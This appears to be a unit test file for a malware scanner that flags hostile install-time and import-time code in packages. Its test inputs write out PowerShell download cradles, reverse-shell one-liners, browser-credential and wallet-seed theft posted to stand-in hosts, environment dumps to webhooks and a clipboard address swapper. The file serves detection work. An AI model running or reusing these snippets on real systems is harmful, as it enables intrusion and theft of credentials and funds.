"""Audit P0s (0.1.7): the install-script blind spots of the PyPI malware
benchmark, and import-time code that is SUSPICIOUS on its own.

Install scripts (install_script_risk) now also fail on PowerShell that hides
or fetches what it runs (an -EncodedCommand, decoded and read; a download
cradle; a download started), a script carried in a string literal that
downloads and runs code, a reverse shell, and the machine's user or host name
sent over the network. Import-time code (import_time_risk) gets the same
signs, and import_time_severity makes SC-IMPORT-RISK CRITICAL for the shapes
no library needs; a download-and-run is CRITICAL in a setup.py and when the
file is run with Python. The dependency decode flow reads a decoder imported
under another name and `.decrypt(` calls. The native engine (which the npm
package runs) is held to these by js/test/supply-chain-signals.test.js and,
on a random corpus, to its recorded outputs by
tests/architecture/test_snapshot_hooks.py.

Everything is inert text: hosts are .invalid, nothing is decoded into a file
or executed.
"""
import base64
import time
import unittest

from tests import _support
from lazaret.scanner import core

PS_RUN = base64.b64encode('Invoke-WebRequest -Uri "https://x.invalid/a.exe" -OutFile "a.exe"; '
                          'Invoke-Expression "a.exe"'.encode("utf-16-le")).decode()
PS_ECHO = base64.b64encode("echo hi".encode("utf-16-le")).decode()


class PowerShellTests(unittest.TestCase):
    def test_encoded_commands(self):
        for text in (f"subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand {PS_RUN}', shell=False)",
                     f"subprocess.run(['powershell.exe', '-enc', '{PS_RUN}'])", f"execSync('pwsh -e {PS_RUN}')",
                     f"os.system('PowerShell /EC {PS_RUN}')"):
            with self.subTest(text[:40]):
                self.assertEqual(core.powershell_risk(text),
                                 ["runs an encoded PowerShell command that downloads and runs code"])
        self.assertEqual(core.powershell_risk(f"os.system('powershell -enc {PS_ECHO}')"),
                         ["runs an encoded PowerShell command"])

    def test_plain_powershell(self):
        cradle = "execSync('powershell -c \"irm https://x.invalid/i.ps1 | iex\"')"
        self.assertEqual(core.powershell_risk(cradle), ["runs PowerShell that downloads and runs code"])
        webclient = "os.system(\"powershell IEX (New-Object Net.WebClient).DownloadString('https://x.invalid/a')\")"
        self.assertEqual(core.powershell_risk(webclient), ["runs PowerShell that downloads and runs code"])
        two_step = ("dl = \"powershell -Command \\\"Invoke-WebRequest -Uri 'https://x.invalid/a.exe' -OutFile 'a.exe'\\\"\"\n"
                    "run = \"powershell -Command \\\"Start-Process 'a.exe'\\\"\"\n")
        self.assertEqual(core.powershell_risk(two_step), ["runs PowerShell that downloads and runs code"])

    def test_not_powershell_that_hides_or_fetches(self):
        for text in ("subprocess.run(['powershell', '-Command', 'Get-ChildItem Env:'])",
                     "powershell -ExecutionPolicy Bypass -File build.ps1", "powershell -enc QUJD",
                     "iwr https://x.invalid/a | iex",            # no PowerShell named: not a command line
                     "# see the -EncodedCommand option of powershell in the docs"):
            with self.subTest(text):
                self.assertEqual(core.powershell_risk(text), [])


class StagerTests(unittest.TestCase):
    def test_a_script_in_a_string_that_downloads_and_runs(self):
        text = ('_t.write(b"""from urllib.request import urlopen as _u;exec(_u(\'https://x.invalid/p\').read())""")\n'
                '_system(f"start {exe} {_t.name}")\n')
        self.assertEqual(core.stager_at(text), text.index('"""'))
        self.assertIn("carries a script that downloads and runs code", core.install_script_risk(text))

    def test_not_a_stager(self):
        for text in ("print('usage: fetch https://x.invalid and run the installer with exec')\n",
                     "DOC = 'Call exec() on trusted code only; see https://docs.invalid'\n",
                     "s = '" + "exec(" * 50 + "http'\n"):
            with self.subTest(text[:30]):
                self.assertEqual(core.stager_at(text), -1)


class ReverseShellTests(unittest.TestCase):
    def test_reverse_shells(self):
        for text in ("s = socket.socket()\ns.connect((h, 4444))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\n"
                     "subprocess.call(['/bin/sh', '-i'])\n",
                     "os.system('bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')\n",
                     "os.system('nc -e /bin/sh 10.0.0.1 4242')\n",
                     "import socket, pty\ns = socket.socket()\ns.connect((h, p))\npty.spawn('/bin/bash')\n",
                     "const net = require('net'), sh = require('child_process').spawn('/bin/sh', []);\n"
                     "const c = new net.Socket();\nc.connect(4444, h, () => { c.pipe(sh.stdin); sh.stdout.pipe(c); });\n"):
            with self.subTest(text[:30]):
                self.assertGreaterEqual(core.reverse_shell_at(text), 0)
                self.assertIn("opens a reverse shell", core.install_script_risk(text))

    def test_not_reverse_shells(self):
        for text in ("fd = os.open(log, os.O_WRONLY)\nos.dup2(fd, 1)\n",
                     "import pty\npty.spawn('/bin/bash')\n",
                     "const sh = spawn('/bin/sh', ['-c', cmd]);\nsh.stdout.pipe(process.stdout);\n"):
            with self.subTest(text[:30]):
                self.assertEqual(core.reverse_shell_at(text), -1)


class HostInfoTests(unittest.TestCase):
    """0.1.8: the host name's flow into a request (0.1.7 read it anywhere in a
    file that used the network anywhere)."""

    def test_sent_over_the_network(self):
        for text in ("import socket, urllib.request\nurllib.request.urlopen('https://x.invalid/?h=' + socket.gethostname())\n",
                     "system(\"curl https://x.invalid/w?us=$(whoami) -d \\\"$(ifconfig)\\\"\")\n",
                     "const os = require('os');\nfetch('https://x.invalid/', {method: 'POST', body: os.hostname()});\n"):
            with self.subTest(text[:30]):
                self.assertIn("sends the machine's user or host name over the network", core.install_script_risk(text))

    def test_kept_local(self):
        for text in ("import socket\nprint(socket.gethostname())\n", "print('run whoami to check')\nrequests.get(u)\n",
                     "import socket, requests\nh = socket.gethostname()\nlog(h)\nrequests.get('https://x.invalid/v')\n"):
            with self.subTest(text[:30]):
                self.assertIsNone(core.local_data_sent_at(text))
                self.assertEqual(core.install_script_risk(text), [])


class FlowNamesTests(unittest.TestCase):
    """0.1.8: the names the data flow follows. A receiver's member is
    followed, not the receiver every method shares (`this.env`, `self.token`);
    keywords name nothing (`const [a, b] = …`, `.then(function* (x) …)`); an
    object literal's methods and a callback given a call are code, not data
    (a bundle's modules: `require_x = __commonJS({ "x.js"(exports) { … } })`);
    and in a long text (a bundle, whose modules reuse names) a name carries
    the data only near where it was given it."""

    SEND = "fetch('https://x.invalid/', {method: 'POST', body: %s});\n"

    def kind(self, text):
        found = core.local_data_sent_at(text)
        return None if found is None else found[1:3]

    def test_a_receivers_member(self):
        js = "class C {\n  constructor() { this.env = process.env; }\n  send() { " + self.SEND + "}\n}\n"
        self.assertEqual(self.kind(js % "JSON.stringify(this.env)"), ("environment", "the whole environment"))
        self.assertIsNone(self.kind(js % "JSON.stringify(this.payload)"))
        py = ("import os, requests\nclass C:\n    def __init__(self):\n        self.token = os.environ['GITHUB_TOKEN']\n"
              "    def go(self):\n        requests.post('https://x.invalid/', data=self.%s)\n")
        self.assertEqual(self.kind(py % "token"), ("environment", "GITHUB_TOKEN"))
        self.assertIsNone(self.kind(py % "payload"))

    def test_keywords_name_nothing(self):
        array = "const os = require('os');\nconst [host, port] = [os.hostname(), 80];\n" + self.SEND
        self.assertEqual(self.kind(array % "host"), ("identity", "hostname"))
        self.assertIsNone(self.kind(array % "String(port)"))
        generator = ("const fs = require('fs');\nfs.promises.readFile('/etc/hostname').then(function* (x) {});\n"
                     + self.SEND % "JSON.stringify({f: function () { return 1; }})")
        self.assertIsNone(self.kind(generator))

    def test_methods_are_code(self):
        bundle = ("var require_x = __commonJS({ \"x.js\"(exports) { var e = process.env; exports.e = 1; } });\n"
                  "var x = require_x();\n" + self.SEND % "JSON.stringify(x)")
        self.assertIsNone(self.kind(bundle))

    def test_a_long_text_follows_a_name_near_its_data(self):
        filler = "".join("function f%d(a) { return a + %d; }\n" % (k, k) for k in range(8000))
        self.assertGreater(len(filler), _support.pack("_LD_LONG"))
        payload = "const os = require('os');\nconst data = {h: os.hostname()};\n" + self.SEND % "JSON.stringify(data)"
        self.assertEqual(self.kind(filler + payload + filler), ("identity", "hostname"))
        far = "var data = {h: require('os').hostname()};\n" + filler + self.SEND % "JSON.stringify(data)"
        self.assertIsNone(self.kind(far))
        near = "var data = {h: require('os').hostname()};\n" + filler[:2000] + self.SEND % "JSON.stringify(data)"
        self.assertEqual(self.kind(near), ("identity", "hostname"))         # (a short text: anywhere)


class FlowShapesTests(unittest.TestCase):
    """The detection round (0.1.8): shapes the data flow did not connect. A
    name spread whole; a function's own return, past the functions defined
    in its body; a method called on a receiver, and the `.then(…)` after a
    call of a function that returns data; a callback the script's own
    function calls with data; a class's constructor, a thread's target; a
    merge; a destructured loop; the machine's modules and HTTP clients under
    the script's own names. A parameter holds what it is given only in its
    function (two functions' parameters of one name are two names)."""

    SEND = "fetch('https://x.invalid/', {method: 'POST', body: %s});\n"
    OS = "const os = require('os');\n"

    def kind(self, text):
        found = core.local_data_sent_at(text)
        return None if found is None else found[1:3]

    def test_a_name_spread_whole(self):
        js = (self.OS + "function collect() {\n  const base = { host: os.hostname() };\n"
              "  return { ...base, t: Date.now() };\n}\nconst data = collect();\n" + self.SEND % "JSON.stringify(data)")
        self.assertEqual(self.kind(js), ("identity", "hostname"))
        merged = (self.OS + "const tags = {};\ntags.host = os.hostname();\nfunction send(extra) {\n"
                  "  const all = { ...tags, ...extra };\n  " + self.SEND % "JSON.stringify(all)" + "}\nsend({});\n")
        self.assertEqual(self.kind(merged), ("identity", "hostname"))
        self.assertIsNone(self.kind(self.OS + "const v = x.base;\n" + self.SEND % "JSON.stringify({...v})"))

    def test_a_return_is_its_own_functions(self):
        nested = (self.OS + "function collect() {\n  const pick = (x) => x.trim();\n"
                  "  const ip = (() => { return '1.2.3.4'; })();\n  return { host: pick(os.hostname()), ip };\n}\n"
                  "const payload = collect();\n" + self.SEND % "JSON.stringify(payload)")
        self.assertEqual(self.kind(nested), ("identity", "hostname"))
        inner = (self.OS + "function outer() {\n  function inner() { return os.hostname(); }\n  return 1;\n}\n"
                 + self.SEND % "String(outer())")
        self.assertIsNone(self.kind(inner))
        py = ("import socket, requests\ndef collect():\n    def clean(x):\n        return x.strip()\n"
              "    return {'h': clean(socket.gethostname())}\nrequests.post('https://x.invalid', json=collect())\n")
        self.assertEqual(self.kind(py), ("identity", "user or host name"))

    def test_methods_on_a_receiver_and_then(self):
        js = (self.OS + "class T {\n  info() { return { host: os.hostname() }; }\n"
              "  go() { const i = this.info(); " + self.SEND % "JSON.stringify(i)" + "  }\n}\n")
        self.assertEqual(self.kind(js), ("identity", "hostname"))
        self.assertIsNone(self.kind(js.replace("this.info()", "this.other()")))
        py = ("import socket, requests\nclass C:\n    def info(self):\n        return {'h': socket.gethostname()}\n"
              "    def go(self):\n        requests.post('https://x.invalid', json=self.info())\n")
        self.assertEqual(self.kind(py), ("identity", "user or host name"))
        then = (self.OS + "function collect() { return new Promise((resolve) => resolve({ host: os.hostname() })); }\n"
                "collect().then((d) => " + self.SEND % "JSON.stringify(d)" + ");\n")
        self.assertEqual(self.kind(then), ("identity", "hostname"))

    def test_callbacks_constructors_and_threads(self):
        callback = (self.OS + "function collect(cb) { cb(null, { h: os.hostname() }); }\n"
                    "collect(function (err, info) { " + self.SEND % "JSON.stringify(%s)" + " });\n")
        self.assertEqual(self.kind(callback % "info"), ("identity", "hostname"))
        self.assertIsNone(self.kind(callback % "err"))
        ctor = (self.OS + "class E {\n  constructor(d) { this.d = d; }\n  go() { " + self.SEND % "JSON.stringify(this.d)"
                + " }\n}\nnew E(%s).go();\n")
        self.assertEqual(self.kind(ctor % "os.hostname()"), ("identity", "hostname"))
        self.assertIsNone(self.kind(ctor % "'x'"))
        thread = ("import socket, threading, requests\ndef send(d):\n    requests.post('https://x.invalid', json=d)\n"
                  "threading.Thread(target=send, args=(%s,)).start()\n")
        self.assertEqual(self.kind(thread % "socket.gethostname()"), ("identity", "user or host name"))
        self.assertIsNone(self.kind(thread % "'x'"))

    def test_a_parameter_is_its_functions(self):
        # (paramiko's config.py: the machine's name given one function's `hostname`, another's sent in a lookup)
        py = ("import socket\nclass Lazy:\n    def __init__(self, host):\n        self.host = host\n"
              "def lookup(hostname):\n    return socket.getaddrinfo(hostname, None)\n"
              "def canonicalize(hostname, domains):\n    for d in domains:\n"
              "        candidate = '{}.{}'.format(hostname, d)\n        socket.gethostbyname(candidate)\n"
              "fqdn = Lazy(socket.gethostname())\nlookup(fqdn.host)\n")
        self.assertIsNone(self.kind(py))
        self.assertEqual(self.kind(py.replace("def canonicalize(hostname, domains)", "def canonicalize(host, domains)")
                                   .replace("format(hostname, d)", "format(socket.gethostname(), d)")),
                         ("identity", "user or host name"))

    def test_a_lookup_of_a_name_composed_with_a_literal(self):
        # (a name given a read and a literal in one statement counts, whenever it is followed)
        for py in ("import socket\nh = socket.gethostname()\nq = h + '.x.invalid.com'\nsocket.getaddrinfo(q, 80)\n",
                   "import socket\nq = socket.gethostname() + '.x.invalid.com'\nsocket.getaddrinfo(q, 80)\n"):
            with self.subTest(py=py):
                self.assertEqual(self.kind(py), ("identity", "user or host name"))
        self.assertIsNone(self.kind("import socket\nh = socket.gethostname()\nsocket.getaddrinfo(h, 80)\n"))

    def test_command_runners_under_other_names(self):
        promisified = ("const util = require('util');\nconst run = util.promisify(require('child_process').exec);\n"
                       "(async () => { const { stdout } = await run('whoami'); " + self.SEND % "stdout" + " })();\n")
        self.assertEqual(self.kind(promisified), ("identity", "whoami"))
        then = ("const { promisify } = require('util');\nconst { exec } = require('child_process');\n"
                "const execP = promisify(exec);\nexecP('hostname').then(({ stdout }) => " + self.SEND % "stdout" + ");\n")
        self.assertEqual(self.kind(then), ("identity", "hostname"))
        self.assertIsNone(self.kind(then.replace("execP('hostname')", "execP('echo ok')")))
        py = ("import asyncio, aiohttp\nasync def main():\n"
              "    p = await asyncio.create_subprocess_shell('whoami', stdout=asyncio.subprocess.PIPE)\n"
              "    out, _ = await p.communicate()\n    async with aiohttp.ClientSession() as s:\n"
              "        await s.post('https://x.invalid', data=out)\n")
        self.assertEqual(self.kind(py), ("identity", "whoami"))
        tuples = "import getpass, socket, requests\nuser, host = getpass.getuser(), %s\nrequests.post('https://x.invalid', data=host)\n"
        self.assertEqual(self.kind(tuples % "socket.gethostname()"), ("identity", "user or host name"))
        self.assertIsNone(self.kind(tuples % "'x'"))

    def test_browser_profiles_and_copied_files(self):
        chrome = ("import os, shutil, sqlite3, requests\n"
                  "db = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')\n"
                  "shutil.copy2(db, 'Loginvault.db')\nconn = sqlite3.connect('Loginvault.db')\ncursor = conn.cursor()\n"
                  "cursor.execute('SELECT origin_url, username_value, password_value FROM logins')\n"
                  "rows = cursor.fetchall()\nrequests.post('https://x.invalid', json=rows)\n")
        self.assertEqual(self.kind(chrome), ("file", "Loginvault.db"))
        self.assertIsNone(self.kind(chrome.replace("shutil.copy2(db, 'Loginvault.db')\n", "")))
        state = ("import os, json, requests\np = os.path.expandvars(r'%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State')\n"
                 "key = json.load(open(p))['os_crypt']['encrypted_key']\nrequests.post('https://x.invalid', data=key)\n")
        self.assertEqual(self.kind(state)[0], "file")
        seed = "import requests\nd = open('%APPDATA%\\\\Exodus\\\\exodus.wallet\\\\seed.seco', 'rb').read()\n" \
               "requests.post('https://x.invalid', data=d)\n"
        self.assertEqual(self.kind(seed)[0], "file")
        js = ("const fs = require('fs'), path = require('path'), os = require('os');\nconst Database = require('better-sqlite3');\n"
              "const src = path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Cookies');\n"
              "const tmp = path.join(os.tmpdir(), 'c.db');\nfs.copyFileSync(src, tmp);\n"
              "const rows = new Database(tmp).prepare('SELECT host_key, name, encrypted_value FROM cookies').all();\n"
              + self.SEND % "JSON.stringify(rows)")
        self.assertEqual(self.kind(js), ("file", "tmp"))

    def test_merges_and_destructured_loops(self):
        merge = self.OS + "const o = {};\nObject.assign(o, { h: os.hostname() });\n" + self.SEND % "JSON.stringify(o)"
        self.assertEqual(self.kind(merge), ("identity", "hostname"))
        loop = (self.OS + "const out = [];\nfor (const [name, list] of Object.entries(os.networkInterfaces())) "
                "out.push(name);\n" + self.SEND % "out.join(',')")
        self.assertEqual(self.kind(loop), ("report", "networkInterfaces"))
        py = ("import os, requests\nd = []\nfor k, v in os.environ.items():\n    d.append(k + '=' + v)\n"
              "requests.post('https://x.invalid', data='\\n'.join(d))\n")
        self.assertEqual(self.kind(py), ("environment", "the whole environment"))

    def test_modules_and_clients_under_other_names(self):
        self.assertEqual(self.kind("const o = require('os');\n" + self.SEND % "JSON.stringify({ h: o.hostname() })"),
                         ("identity", "hostname"))
        self.assertEqual(self.kind("import * as o from 'node:os';\n" + self.SEND % "o.homedir()"),
                         ("report", "homedir"))
        self.assertEqual(self.kind("import platform as pl, requests\nrequests.post('https://x.invalid', data=pl.node())\n"),
                         ("identity", "user or host name"))
        self.assertIsNone(self.kind("const o = require('os');\n" + self.SEND % "o.platform()"))
        clients = {
            "const nf = require('node-fetch');\nnf('https://x.invalid', { method: 'POST', body: os.hostname() });\n":
                ("identity", "hostname"),
            "const api = require('axios').create({});\napi.post('/c', { h: os.hostname() });\n": ("identity", "hostname"),
            "import request from 'request';\nrequest.post({ url: 'https://x.invalid', json: { h: os.hostname() } });\n":
                ("identity", "hostname"),
        }
        for js, want in clients.items():
            with self.subTest(js=js):
                self.assertEqual(self.kind(self.OS + js), want)
        py = ("import socket, requests\ns = requests.Session()\ns.post('https://x.invalid', json={'h': socket.gethostname()})\n")
        self.assertEqual(self.kind(py), ("identity", "user or host name"))
        with_client = ("import socket, httpx\nwith httpx.Client() as c:\n"
                       "    c.request('POST', 'https://x.invalid', json={'h': socket.gethostname()})\n")
        self.assertEqual(self.kind(with_client), ("identity", "user or host name"))


class ContainerTests(unittest.TestCase):
    """D-3 (0.1.9): what a script puts into a container, the container holds, on the tree as in the text. The
    JavaScript tree model knew an array's push and unshift on a name alone, so an install script that put the whole
    environment into a FormData, a Map or a Set, or Object.assign'ed it into an object, and sent that, had no finding
    at all: the tree answered, and the text follower (which reads `x.append(…)` and `x.add(…)`) answers only what
    the tree cannot read. Python's model had them (its COLLECTS). A member's container (`o.list.push(x)`,
    `this.items.push(x)`) is D-3b's (MemberContainerTests)."""

    SEND = "fetch('https://x.invalid/c', {method: 'POST', body: %s});\n"
    WHOLE = "sends environment variables over the network (the whole environment)"
    FILLS = (
        ("const c = new FormData();\nc.append('e', JSON.stringify(process.env));\n", "c"),
        ("const c = new Map();\nc.set('e', process.env);\n", "JSON.stringify(Object.fromEntries(c))"),
        ("const c = new Set();\nc.add(JSON.stringify(process.env));\n", "JSON.stringify([...c])"),
        ("const c = new URLSearchParams();\nc.append('e', JSON.stringify(process.env));\n", "c.toString()"),
        ("const c = [];\nc.splice(0, 0, process.env);\n", "JSON.stringify(c)"),
        ("const c = {};\nObject.assign(c, { e: process.env });\n", "JSON.stringify(c)"),
        ("const c = {};\nReflect.set(c, 'e', process.env);\n", "JSON.stringify(c)"),
        ("const c = new Map();\nfunction keep() { c.set('e', process.env); }\nkeep();\n", "JSON.stringify([...c])"),
    )

    def test_each_container_is_sent(self):
        for fill, body in self.FILLS:
            text = fill + self.SEND % body
            with self.subTest(fill=fill):
                self.assertEqual(core.install_script_risk(text, lang="js"), [self.WHOLE])
                reasons, _line = core.import_time_risk(text, lang="js")
                self.assertEqual(reasons, ["reads credentials or the whole environment and sends data over the network"])

    def test_what_is_not_sent(self):
        quiet = ("const c = new Map();\nc.set('e', process.env);\n" + self.SEND % "'ok'",
                 "const h = new Headers();\nh.set('accept', 'application/json');\n"
                 "fetch('https://x.invalid/c', {method: 'POST', headers: h});\n")
        for text in quiet:
            with self.subTest(text=text):
                self.assertEqual(core.install_script_risk(text, lang="js"), [])


class MemberContainerTests(unittest.TestCase):
    """D-3b (0.1.9): a member's container holds what it is given, apart from the object that holds it, as an
    assignment to a member of `this` is held: `o.list.push(x)`, `o.m.set(k, x)`, `this.items.push(x)`,
    `Object.assign(this.opts, …)`. D-3 left them out: put into the object that holds them, what they were given
    reached every member read of that object, and joined unrelated flows in large bundles (vite's, monaco-editor's
    loader). The object's other members do not hold it, and neither does the object sent whole (`JSON.stringify(o)`
    after `o.list.push(x)`, as before)."""

    SEND = ContainerTests.SEND
    WHOLE = ContainerTests.WHOLE
    CLASS = ("class C {\n  constructor() { this.items = []; this.opts = {}; this.name = 'x'; }\n  keep() { %s }\n"
             "  send() { %s }\n}\nconst c = new C();\nc.keep();\nc.send();\n")
    SENT = (
        "const o = { list: [] };\no.list.push(process.env);\n" + SEND % "JSON.stringify(o.list)",
        "const o = { m: new Map() };\no.m.set('e', process.env);\n" + SEND % "JSON.stringify([...o.m])",
        "const o = { opts: {} };\nObject.assign(o.opts, { e: process.env });\n" + SEND % "JSON.stringify(o.opts)",
        "const store = { list: [] };\nfunction keep() { store.list.push(process.env); }\nkeep();\n"
        + SEND % "JSON.stringify(store.list)",
        CLASS % ("this.items.push(process.env);", SEND % "JSON.stringify(this.items)"),
        CLASS % ("Object.assign(this.opts, process.env);", SEND % "JSON.stringify(this.opts)"),
    )

    def test_each_container_is_sent(self):
        for text in self.SENT:
            with self.subTest(text=text):
                self.assertEqual(core.install_script_risk(text, lang="js"), [self.WHOLE])
                reasons, _line = core.import_time_risk(text, lang="js")
                self.assertEqual(reasons, ["reads credentials or the whole environment and sends data over the network"])

    def test_the_objects_other_members(self):
        for text in ("const o = { list: [], name: 'x' };\no.list.push(process.env);\n" + self.SEND % "o.name",
                     self.CLASS % ("this.items.push(process.env);", self.SEND % "this.name")):
            with self.subTest(text=text):
                self.assertEqual(core.install_script_risk(text, lang="js"), [])


class InstanceTests(unittest.TestCase):
    """B-3 (0.1.9): a method reads `this` as the value it is called on, in a class made in several places, whose
    instances B-1 keeps apart (vite's MagicString). What one method of an instance was given reached nothing another
    method of that instance did with it (`r.setCode(t); r.run()`, where `run` evals `this.c`): such a class's `this.c`
    holds nothing a call on an instance gives. Now it reaches it, and no other instance's. A class made once is
    followed as before."""

    CLASS = "class R {\n  setCode(t) { this.c = t; }\n  go() { this.run(); }\n  run() { eval(this.c); }\n}\n"
    MADE = "const a = new R();\nconst b = new R();\n"
    GET = ("const https = require('https');\nhttps.get('https://x.invalid/c', (res) => {\n  let d = '';\n"
           "  res.on('data', (c) => { d += c; });\n  res.on('end', () => { a.setCode(d); a.RUN(); });\n});\n")
    RUNS = "runs code it receives over the network"

    def test_what_an_instance_was_given_another_method_runs(self):
        for call in ("run", "go"):
            with self.subTest(call):
                reasons, _line = core.import_time_risk(self.CLASS + self.MADE + self.GET.replace("RUN", call), lang="js")
                self.assertIn(self.RUNS, reasons)

    def test_another_instance_runs_nothing_it_was_not_given(self):
        text = self.CLASS + self.MADE + self.GET.replace("a.RUN()", "b.run()")
        reasons, _line = core.import_time_risk(text, lang="js")
        self.assertNotIn(self.RUNS, reasons)


class NamedListTests(unittest.TestCase):
    """B-6 (0.1.9): Python's comprehension over the environment reads what the names in its test are given, as the
    JavaScript model reads a named list. `{k: v for k, v in os.environ.items() if any(p in k for p in PATTERNS)}`
    with `PATTERNS = ['TOKEN', 'SECRET']` read as a selection, so it had no finding; with the words inline it was the
    whole environment. A test that selects by named prefixes (vite's `VITE_`) still selects."""

    SEND = "requests.post('https://x.invalid/c', json=env)\n"
    WHOLE = "sends environment variables over the network (the whole environment)"

    def test_secret_words_in_a_named_list(self):
        for text in ("import os, requests\nPATTERNS = ['TOKEN', 'SECRET']\n"
                     "env = {k: v for k, v in os.environ.items() if any(p in k for p in PATTERNS)}\n" + self.SEND,
                     "import os, requests\nWORDS = ('KEY', 'PASSWORD')\n"
                     "env = [v for k, v in os.environ.items() if any(w in k.upper() for w in WORDS)]\n" + self.SEND):
            with self.subTest(text=text):
                self.assertEqual(core.install_script_risk(text, lang="py"), [self.WHOLE])
                reasons, _line = core.import_time_risk(text, lang="py")
                self.assertEqual(reasons, ["reads credentials or the whole environment and sends data over the network"])

    def test_named_prefixes_select(self):
        text = ("import os, requests\nPREFIXES = ('VITE_', 'APP_')\n"
                "env = {k: v for k, v in os.environ.items() if k.startswith(PREFIXES)}\n" + self.SEND)
        self.assertEqual(core.install_script_risk(text, lang="py"), [])


class WalletSwapTests(unittest.TestCase):
    """The detection round (0.1.8): a script that puts its own wallet address
    in place of the one its user copies or sends — patterns of two kinds of
    address, where the user's addresses pass intercepted (the clipboard read
    and written, the page's requests and its wallet), an address of its own
    written in the code. Any two of the three are ordinary code."""

    OWN = "OWN = '0x52908400098527886E0F7030069857D2E4169EE7'\n"
    PATTERNS = "ETH = r'^0x[a-fA-F0-9]{40}$'\nBTC = r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$'\n"
    CLIP = "import pyperclip\nc = pyperclip.paste()\npyperclip.copy(OWN)\n"

    def test_a_clipper(self):
        self.assertEqual(core.wallet_swap_at(self.OWN + self.PATTERNS + self.CLIP)[1], "the clipboard")
        reasons = core.install_script_risk(self.OWN + self.PATTERNS + self.CLIP)
        self.assertIn("swaps the cryptocurrency wallet addresses its user copies or sends for its own (the clipboard)",
                      reasons)
        reasons, _ = core.import_time_risk(self.OWN + self.PATTERNS + self.CLIP, "py")
        self.assertEqual(core.import_time_severity(reasons), "CRITICAL")

    def test_any_two_parts_are_ordinary(self):
        self.assertIsNone(core.wallet_swap_at(self.PATTERNS + self.CLIP))           # no address of its own
        self.assertIsNone(core.wallet_swap_at(self.OWN + self.CLIP))                # no patterns
        self.assertIsNone(core.wallet_swap_at(self.OWN + self.PATTERNS))            # nothing intercepted
        self.assertIsNone(core.wallet_swap_at(self.OWN + self.PATTERNS.split("\n")[0] + "\n" + self.CLIP))  # one kind
        copy_only = self.OWN + self.PATTERNS + "import pyperclip\npyperclip.copy(OWN)\n"
        self.assertIsNone(core.wallet_swap_at(copy_only))                           # a wallet's "copy address"
        zero = self.PATTERNS + self.CLIP.replace("OWN", "'0x0000000000000000000000000000000000000000'")
        self.assertIsNone(core.wallet_swap_at(zero))

    def test_a_page_script_that_hooks_requests(self):
        js = ("const own = ['0x52908400098527886E0F7030069857D2E4169EE7'];\n"
              "const pats = { eth: /\\b0x[a-fA-F0-9]{40}\\b/g, btc: /\\b(bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71})\\b/g };\n"
              "%s\n")
        for hook in ("const f = fetch;\nfetch = async function (...a) { return f(...a); };",
                     "XMLHttpRequest.prototype.send = function (b) { return send.call(this, b); };",
                     "window.ethereum.request = async (args) => orig(args);"):
            with self.subTest(hook=hook):
                self.assertEqual(core.wallet_swap_at(js % hook)[1], "the page's requests and its wallet")
        self.assertIsNone(core.wallet_swap_at(js % "const r = await fetch(url);"))


class ImportTimeGradingTests(unittest.TestCase):
    def grade(self, text):
        reasons, line = core.import_time_risk(text)
        return reasons, line, core.import_time_severity(reasons)

    def test_strong_signs_are_critical(self):
        beacon = ("import socket, requests\n\ndef send():\n"
                  "    requests.post('https://webhook.site/0000', json={'h': socket.gethostname()})\n")
        reasons, line, sev = self.grade(beacon)
        self.assertEqual((reasons, line, sev), (
            ["sends the machine's user or host name to a data-capture service (webhook.site)"], 4, "CRITICAL"))
        harvest = "import os, json, requests\nrequests.post('https://discord.com/api/webhooks/1/x', data=json.dumps(dict(os.environ)))\n"
        self.assertEqual(self.grade(harvest)[2], "CRITICAL")
        self.assertIn("sends them to an exfiltration service (discord.com/api/webhooks)", self.grade(harvest)[0][0])
        # 2.17: what no library sends when it is loaded, sent anywhere
        anywhere = harvest.replace("discord.com/api/webhooks/1/x", "api.invalid/c")
        self.assertEqual(self.grade(anywhere)[::2], (
            ["reads credentials or the whole environment and sends data over the network"], "CRITICAL"))
        for text in (f"subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand {PS_RUN}')\n",
                     "import urllib.request\nexec(urllib.request.urlopen('https://x.invalid/p').read())\n",
                     "s = socket.socket()\ns.connect((h, 4444))\nos.dup2(s.fileno(), 0)\nsubprocess.call(['/bin/sh', '-i'])\n",
                     "import requests, subprocess\nd = requests.get('https://x.invalid/p').content\n"
                     "open('p.py', 'wb').write(d)\nsubprocess.run(['python3', 'p.py'])\n"):
            with self.subTest(text[:30]):
                self.assertEqual(self.grade(text)[2], "CRITICAL")

    def test_what_sdks_share_stays_major_or_quiet(self):
        telemetry = "import socket, requests\nrequests.post('https://telemetry.invalid/v1', json={'host': socket.gethostname()})\n"
        self.assertEqual(self.grade(telemetry)[0], [])                      # host name to its own service
        notifier = "import socket, requests\nrequests.post('https://api.telegram.org/bot/sendMessage', data={'text': socket.gethostname()})\n"
        self.assertEqual(self.grade(notifier)[0], [])                       # a notification library
        one = "import os, requests\nrequests.post('https://api.invalid/c', headers={'key': os.environ['EXAMPLE_KEY']})\n"
        self.assertEqual(self.grade(one)[0], [])                            # its own key, to its service
        binary = ("const https = require('https');\nhttps.get(u, (r) => r.pipe(fs.createWriteStream(dst)));\n"
                  "execFileSync(dst, ['--version']);\n")
        reasons, _line, sev = self.grade(binary)
        self.assertEqual(sev, "MAJOR", reasons)


class ImportTimeProseTests(unittest.TestCase):
    """Comments and docstrings are not import-time code, and PowerShell counts
    there only as an argument of an exec call (the huggingface-hub and
    paramiko false positives of the audit's benign corpus)."""

    def test_a_cli_that_builds_its_self_update_command(self):
        text = ("import subprocess\n\ndef run_update():\n    return subprocess.call(_cmd())\n\n\ndef _cmd():\n"
                "    # `iwr ... | iex` cannot take parameters: create a scriptblock\n"
                "    return [\"powershell\", \"-NoProfile\", \"-Command\", \"& ([scriptblock]::Create((iwr -useb "
                "https://x.invalid/i.ps1)))\"]\n")
        self.assertEqual(core.import_time_risk(text, "py"), ([], None))
        self.assertEqual(core.import_time_risk(text), ([], None))       # the argv is returned, not run here

    def test_a_docstring_that_shows_the_installer(self):
        text = ('import subprocess\n\ndef installed():\n    """True when installed with\n'
                '        powershell -ExecutionPolicy ByPass -c "irm https://x.invalid/i.ps1 | iex"\n    """\n'
